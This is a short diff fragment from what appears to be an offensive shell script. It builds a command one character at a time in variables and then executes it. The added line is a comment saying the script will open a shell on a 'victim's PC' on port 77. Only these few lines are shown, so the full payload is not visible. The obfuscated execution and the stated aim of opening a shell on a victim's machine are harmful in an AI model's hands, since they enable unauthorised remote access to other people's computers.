@@ -44,3 +44,5 @@ a=$a$b
 b="h"
 a=$a$b
 $a
+
+##this will pump shell in victim's PC port 77
